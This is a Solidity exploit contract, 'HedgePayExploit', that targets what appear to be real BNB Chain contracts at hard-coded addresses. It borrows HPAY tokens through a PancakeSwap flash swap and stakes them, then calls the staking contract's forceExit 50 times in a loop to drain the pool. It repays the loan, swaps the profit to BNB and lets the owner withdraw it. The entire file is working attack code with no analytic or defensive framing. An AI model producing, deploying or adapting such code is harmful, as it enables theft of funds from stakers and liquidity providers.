// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IPancakeRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function WETH() external view returns (address);
}

interface IHedgePayStaking {
    function stake(uint256 amount) external;
    function forceExit() external;
    function stakingToken() external view returns (address);
}

contract HedgePayExploit {
    address constant HPAY           = 0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A;
    address constant STAKING        = 0x6E30c17D2554DCA5A1Ac178939764c6Bf61AB95a;
    address constant PAIR_BTCB_HPAY = 0xF603ae6EF2Bf30EC77539279eFbE80e3e0e8e233;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant BTCB           = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant WBNB           = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        uint256 stakingBalance = IERC20(HPAY).balanceOf(STAKING);
        uint256 borrowAmount = stakingBalance / 50;
        bytes memory data = abi.encode(borrowAmount);
        IPancakePair(PAIR_BTCB_HPAY).swap(0, borrowAmount, address(this), data);
        uint256 remaining = IERC20(HPAY).balanceOf(address(this));
        IERC20(HPAY).approve(PANCAKE_ROUTER, remaining);
        address[] memory path = new address[](3);
        path[0] = HPAY;
        path[1] = BTCB;
        path[2] = WBNB;

        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            remaining,
            0,
            path,
            address(this),
            block.timestamp + 120
        );
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        require(msg.sender == PAIR_BTCB_HPAY, "not pair");
        uint256 hpayBalance = IERC20(HPAY).balanceOf(address(this));
        IERC20(HPAY).approve(STAKING, hpayBalance);
        IHedgePayStaking(STAKING).stake(hpayBalance);
        for (uint256 i = 0; i < 50; i++) {
            IHedgePayStaking(STAKING).forceExit();
        }

        uint256 repayAmount = (amount1 * 10000 / 9975) + 1;
        repayAmount = repayAmount * 105 / 100;
        IERC20(HPAY).transfer(PAIR_BTCB_HPAY, repayAmount);
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}
